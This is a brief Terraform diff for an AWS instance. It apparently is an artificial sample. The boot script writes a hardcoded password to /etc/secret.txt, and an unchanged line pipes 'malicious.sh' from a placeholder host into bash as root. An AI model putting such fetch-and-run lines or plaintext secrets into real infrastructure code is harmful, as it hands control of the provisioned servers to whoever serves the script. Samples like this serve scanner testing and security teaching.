@@ -10,7 +10,7 @@ resource "aws_instance" "web_server" {
 
   user_data = <<-EOF
     #!/bin/bash
-    echo "Sensitive data: password23" > /etc/secret.txt
+    echo "Sensitive data: password273" > /etc/secret.txt
     sudo curl http://example.com/malicious.sh | bash
   EOF
   tags = {
